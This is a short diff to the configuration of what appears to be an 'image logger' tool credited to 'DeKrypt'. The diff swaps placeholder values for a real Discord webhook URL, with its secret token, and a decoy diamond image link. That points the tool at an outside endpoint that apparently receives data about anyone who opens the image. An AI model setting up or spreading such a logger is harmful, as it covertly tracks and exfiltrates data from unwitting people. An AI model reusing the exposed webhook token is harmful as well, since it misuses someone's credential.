@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://canary.discord.com/api/webhooks/1346060591818604584/P5OMSN681BQ1B4GReiX3eP-012rJtNcKTAa_o8cMX_M0J0UYHEHxvT5ggmN76mAGb4QM",
+    "image": "https://w7.pngwing.com/pngs/927/515/png-transparent-diamond-isolated-transparent-diamond-isolated-diamond-png-images-png-diamond-transparent-background-thumbnail.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
